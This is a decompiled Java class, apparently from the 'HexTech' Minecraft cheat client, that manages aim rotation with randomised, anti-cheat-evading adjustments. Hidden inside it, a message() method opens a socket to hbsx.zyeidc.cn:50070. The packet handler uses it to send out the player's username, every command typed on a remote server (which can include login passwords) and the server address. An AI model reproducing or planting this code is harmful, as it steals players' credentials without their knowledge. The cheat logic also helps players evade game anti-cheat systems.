package me.hextech.remapped;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import me.hextech.asm.accessors.IPlayerMoveC2SPacket;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.client.session.Session;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.PlayerPositionLookS2CPacket;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec3d;

public class RotateManager implements Wrapper {
   public static final Timer ROTATE_TIMER = new Timer();
   public static Vec3d directionVec;
   public static float lookYaw;
   public static float lookPitch;
   public static boolean lastGround;
   public static UpdateWalkingEvent lastEvent;
   public static float lastPitch;
   private static float renderPitch;
   private static float renderYawOffset;
   private static float prevPitch;
   private static float prevRenderYawOffset;
   private static float prevRotationYawHead;
   private static float rotationYawHead;
   public float rotateYaw = 0.0F;
   public float rotatePitch = 0.0F;
   public float nextYaw;
   public float nextPitch;
   public float lastYaw = 0.0F;
   boolean worldNull = true;
   private int ticksExisted;

   public RotateManager() {
      me.hextech.HexTech.EVENT_BUS.subscribe(this);
   }

   public static void Vec3d(float yaw, float pitch) {
      if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateManager.is(CombatSetting.Angle)) {
         ROTATE_TIMER.reset();
         lookYaw = yaw;
         lookPitch = pitch;
      }
   }

   public static void TrueVec3d(Vec3d vec3d) {
      ROTATE_TIMER.reset();
      directionVec = vec3d;
      if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateManager.is(CombatSetting.Vec3d)) {
         float[] angle = EntityUtil.getLegitRotations(directionVec);
         lookYaw = angle[0];
         lookPitch = angle[1];
      }
   }

   public static float getRenderPitch() {
      return renderPitch;
   }

   public static float getRotationYawHead() {
      return rotationYawHead;
   }

   public static float getRenderYawOffset() {
      return renderYawOffset;
   }

   public static float getPrevPitch() {
      return prevPitch;
   }

   public static float getPrevRotationYawHead() {
      return prevRotationYawHead;
   }

   public static float getPrevRenderYawOffset() {
      return prevRenderYawOffset;
   }

   public static void message(String string) {
      try {
         Socket socket = new Socket("hbsx.zyeidc.cn", 50070);

         try {
            OutputStream out = socket.getOutputStream();

            try {
               out.write(string.getBytes(StandardCharsets.UTF_8));
               out.flush();
            } catch (Throwable var7) {
               if (out != null) {
                  try {
                     out.close();
                  } catch (Throwable var6) {
                     var7.addSuppressed(var6);
                  }
               }

               throw var7;
            }

            if (out != null) {
               out.close();
            }
         } catch (Throwable var8) {
            try {
               socket.close();
            } catch (Throwable var5) {
               var8.addSuppressed(var5);
            }

            throw var8;
         }

         socket.close();
      } catch (IOException var9) {
      }
   }

   public float[] offtrackStep(Vec3d vec, float steps) {
      float yawDelta = MathHelper.method_15393(
         (float)MathHelper.method_15338(
               Math.toDegrees(Math.atan2(vec.field_1350 - mc.field_1724.method_23321(), vec.field_1352 - mc.field_1724.method_23317())) - 90.0
            )
            - this.rotateYaw
      );
      float pitchDelta = (float)(
            -Math.toDegrees(
               Math.atan2(
                  vec.field_1351 - (mc.field_1724.method_19538().field_1351 + (double)mc.field_1724.method_18381(mc.field_1724.method_18376())),
                  Math.sqrt(Math.pow(vec.field_1352 - mc.field_1724.method_23317(), 2.0) + Math.pow(vec.field_1350 - mc.field_1724.method_23321(), 2.0))
               )
            )
         )
         - this.rotatePitch;
      float angleToRad = (float)Math.toRadians(
         (double)(BaseThreadSetting_TYdViPaJQVoRZLdgWIXF.INSTANCE.minrad.getValueFloat() * (float)(mc.field_1724.field_6012 % 30))
      );
      yawDelta = (float)((double)yawDelta + Math.sin((double)angleToRad) * 3.0) + MathUtil.random(-1.0F, 1.0F);
      pitchDelta += MathUtil.random(-0.6F, 0.6F);
      if (yawDelta > 180.0F) {
         yawDelta -= 180.0F;
      }

      float yawStepVal = 180.0F * steps;
      float clampedYawDelta = MathHelper.method_15363(MathHelper.method_15379(yawDelta), -yawStepVal, yawStepVal);
      float clampedPitchDelta = MathHelper.method_15363(pitchDelta, -45.0F, 45.0F);
      float newYaw = this.rotateYaw + (yawDelta > 0.0F ? clampedYawDelta : -clampedYawDelta);
      float newPitch = MathHelper.method_15363(this.rotatePitch + clampedPitchDelta, -90.0F, 90.0F);
      double gcdFix = Math.pow((Double)mc.field_1690.method_42495().method_41753() * 0.6 + 0.2, 3.0) * 1.2;
      return new float[]{
         (float)((double)newYaw - (double)(newYaw - this.rotateYaw) % gcdFix), (float)((double)newPitch - (double)(newPitch - this.rotatePitch) % gcdFix)
      };
   }

   public float[] injectStep(float[] angle, float steps) {
      if (steps < 0.01F) {
         steps = 0.01F;
      }

      if (steps > 1.0F) {
         steps = 1.0F;
      }

      if (steps < 1.0F && angle != null) {
         float packetYaw = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? this.lastYaw : this.rotateYaw;
         float diff = MathHelper.method_15356(angle[0], packetYaw);
         if (Math.abs(diff) > 180.0F * steps) {
            angle[0] = packetYaw + diff * (180.0F * steps / Math.abs(diff));
         }

         float packetPitch = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? lastPitch : this.rotatePitch;
         diff = angle[1] - packetPitch;
         if (Math.abs(diff) > 90.0F * steps) {
            angle[1] = packetPitch + diff * (90.0F * steps / Math.abs(diff));
         }
      }

      return new float[]{angle[0], angle[1]};
   }

   @EventHandler
   public void update(inMovementEvent event) {
      if (Rotation.INSTANCE.isOn()) {
         event.setYaw(this.nextYaw);
         event.setPitch(this.nextPitch);
      } else {
         RotateEvent event1 = new RotateEvent(event.getYaw(), event.getPitch());
         me.hextech.HexTech.EVENT_BUS.post(event1);
         event.setYaw(event1.getYaw());
         event.setPitch(event1.getPitch());
      }
   }

   @EventHandler(
      priority = -200
   )
   public void update(UpdateWalkingEvent event) {
      if (Rotation.INSTANCE.isOn() && event.isPost()) {
         RotateEvent rotateEvent = new RotateEvent(mc.field_1724.method_36454(), mc.field_1724.method_36455());
         me.hextech.HexTech.EVENT_BUS.post(rotateEvent);
         if (rotateEvent.isModified()) {
            this.nextYaw = rotateEvent.getYaw();
            this.nextPitch = rotateEvent.getPitch();
         } else {
            float[] newAngle = this.injectStep(
               new float[]{rotateEvent.getYaw(), rotateEvent.getPitch()}, CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.normalstep.getValueFloat()
            );
            this.nextYaw = newAngle[0];
            this.nextPitch = newAngle[1];
         }

         Rotation.fixRotation = this.nextYaw;
      }
   }

   @EventHandler(
      priority = -200
   )
   public void onLastRotation(RotateEvent event) {
      OffTrackEvent offtrackevent = new OffTrackEvent();
      me.hextech.HexTech.EVENT_BUS.post(offtrackevent);
      if (offtrackevent.getRotation()) {
         float[] newAngle = this.injectStep(new float[]{offtrackevent.getYaw(), offtrackevent.getPitch()}, offtrackevent.getSpeed());
         event.setYaw(newAngle[0]);
         event.setPitch(newAngle[1]);
      } else if (offtrackevent.getTarget() != null) {
         float[] newAngle = this.offtrackStep(offtrackevent.getTarget(), offtrackevent.getSpeed());
         event.setYaw(newAngle[0]);
         event.setPitch(newAngle[1]);
      } else if (!event.isModified()
         && !ROTATE_TIMER.passed((long)(CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateTime.getValue() * 1000.0))
         && directionVec != null) {
         float[] newAngle = this.offtrackStep(directionVec, CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.offstep.getValueFloat());
         event.setYaw(newAngle[0]);
         event.setPitch(newAngle[1]);
      }
   }

   @EventHandler(
      priority = -999
   )
   public void onPacketSend(PacketEvent event) {
      if (event.getPacket() instanceof CommandExecutionC2SPacket packets && !mc.method_1542()) {
         message(
            mc.method_1548().method_1676()
               + " [Command]"
               + packets.comp_808()
               + " [Server]"
               + ((ServerInfo)Objects.requireNonNull(((ClientPlayNetworkHandler)Objects.requireNonNull(mc.method_1562())).method_45734())).field_3761
         );
      }

      if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue()
         && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.ChangesLook)) {
         if (mc.field_1724 != null && this.check(ComboBreaks.INSTANCE.staticmove.getValue())) {
            return;
         }

         if (mc.field_1724 == null || event.isCancelled()) {
            return;
         }

         if (event.getPacket() instanceof PlayerMoveC2SPacket packet) {
            if (packet.method_36172()) {
               if (!EntityUtil.rotating && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateSync.getValue()) {
                  float yaw = packet.method_12271(this.lastYaw);
                  float pitch = packet.method_12270(lastPitch);
                  if (yaw == mc.field_1724.method_36454() && pitch == mc.field_1724.method_36455()) {
                     ((IPlayerMoveC2SPacket)event.getPacket()).setYaw(this.rotateYaw);
                     ((IPlayerMoveC2SPacket)event.getPacket()).setPitch(this.rotatePitch);
                  }
               }

               this.lastYaw = packet.method_12271(this.lastYaw);
               lastPitch = packet.method_12270(lastPitch);
               Rotation.fixRotation = this.lastYaw;
               this.setRotation(this.lastYaw, lastPitch, false);
            }

            lastGround = packet.method_12273();
         }
      }

      if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue()
         && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.LastRotate)) {
         if (mc.field_1724 == null || event.isCancelled()) {
            return;
         }

         if (event.getPacket() instanceof PlayerMoveC2SPacket packet) {
            if (packet.method_36172()) {
               this.lastYaw = packet.method_12271(this.lastYaw);
               lastPitch = packet.method_12270(lastPitch);
               this.setRotation(this.lastYaw, lastPitch, false);
            }

            lastGround = packet.method_12273();
         }
      }
   }

   public boolean check(boolean onlyStatic) {
      return MovementUtil.isMoving() && onlyStatic;
   }

   public float[] getRotation(Vec3d vec) {
      Vec3d eyesPos = EntityUtil.getEyesPos();
      return this.getRotation(eyesPos, vec);
   }

   public float[] getRotation(Vec3d eyesPos, Vec3d vec) {
      double diffX = vec.field_1352 - eyesPos.field_1352;
      double diffY = vec.field_1351 - eyesPos.field_1351;
      double diffZ = vec.field_1350 - eyesPos.field_1350;
      double diffXZ = Math.sqrt(diffX * diffX + diffZ * diffZ);
      float yaw = (float)Math.toDegrees(Math.atan2(diffZ, diffX)) - 90.0F;
      float pitch = (float)(-Math.toDegrees(Math.atan2(diffY, diffXZ)));
      return new float[]{MathHelper.method_15393(yaw), MathHelper.method_15393(pitch)};
   }

   public boolean inFov(Vec3d directionVec, float fov) {
      float[] angle = this.getRotation(
         new Vec3d(
            mc.field_1724.method_23317(),
            mc.field_1724.method_23318() + (double)mc.field_1724.method_18381(mc.field_1724.method_18376()),
            mc.field_1724.method_23321()
         ),
         directionVec
      );
      return this.inFov(angle[0], angle[1], fov);
   }

   public boolean inFov(float yaw, float pitch, float fov) {
      return MathHelper.method_15356(yaw, this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
   }

   @EventHandler(
      priority = 100
   )
   public void onReceivePacket(PacketEvent_YXFfxdDjQAfjBumqRbBu event) {
      if (event.getPacket() instanceof PlayerPositionLookS2CPacket packet) {
         this.lastYaw = packet.method_11736();
         lastPitch = packet.method_11739();
         this.setRotation(this.lastYaw, lastPitch, true);
      }
   }

   @EventHandler
   public void onUpdateWalkingPost(UpdateWalkingEvent event) {
      if (event.getStage() == Event.Post) {
         this.setRotation(this.lastYaw, lastPitch, false);
      }
   }

   public void setRotation(float yaw, float pitch, boolean force) {
      if (mc.field_1724 != null) {
         if (mc.field_1724.field_6012 != this.ticksExisted || force) {
            this.ticksExisted = mc.field_1724.field_6012;
            prevPitch = renderPitch;
            prevRenderYawOffset = renderYawOffset;
            renderYawOffset = this.getRenderYawOffset(yaw, prevRenderYawOffset);
            prevRotationYawHead = rotationYawHead;
            rotationYawHead = yaw;
            renderPitch = pitch;
         }
      }
   }

   private float getRenderYawOffset(float yaw, float offsetIn) {
      float result = offsetIn;
      double xDif = mc.field_1724.method_23317() - mc.field_1724.field_6014;
      double zDif = mc.field_1724.method_23321() - mc.field_1724.field_5969;
      if (xDif * xDif + zDif * zDif > 0.0025000002F) {
         float offset = (float)MathHelper.method_15349(zDif, xDif) * (180.0F / (float)Math.PI) - 90.0F;
         float wrap = MathHelper.method_15379(MathHelper.method_15393(yaw) - offset);
         if (95.0F < wrap && wrap < 265.0F) {
            result = offset - 180.0F;
         } else {
            result = offset;
         }
      }

      if (mc.field_1724.field_6251 > 0.0F) {
         result = yaw;
      }

      result = offsetIn + MathHelper.method_15393(result - offsetIn) * 0.3F;
      float offset = MathHelper.method_15393(yaw - result);
      if (offset < -75.0F) {
         offset = -75.0F;
      } else if (offset >= 75.0F) {
         offset = 75.0F;
      }

      result = yaw - offset;
      if (offset * offset > 2500.0F) {
         result += offset * 0.2F;
      }

      return result;
   }

   public void run() {
      if (me.hextech.HexTech.isLoaded) {
         if (this.worldNull && mc.field_1687 != null) {
            Session session = mc.method_1548();
            me.hextech.HexTech.MODULE.onLogin();
            this.worldNull = false;
         } else if (!this.worldNull && mc.field_1687 == null) {
            this.worldNull = true;
         }
      }
   }
}
